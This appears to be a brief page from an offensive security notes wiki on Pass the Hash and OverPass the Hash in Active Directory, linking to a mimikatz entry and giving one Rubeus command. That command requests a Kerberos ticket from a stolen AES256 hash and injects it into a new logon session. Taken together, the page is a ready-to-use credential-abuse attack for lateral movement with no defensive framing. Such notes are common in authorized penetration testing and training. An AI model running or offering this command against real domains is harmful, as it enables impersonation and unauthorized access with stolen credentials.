# Pass The Hash

### OverPass the Hash

#### With mimikatz

[#overpass-the-hash](../../exploitation-abuse/mimi-tools.md#overpass-the-hash "mention")

#### With Rubeus

{% code overflow="wrap" %}
```cmd
Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

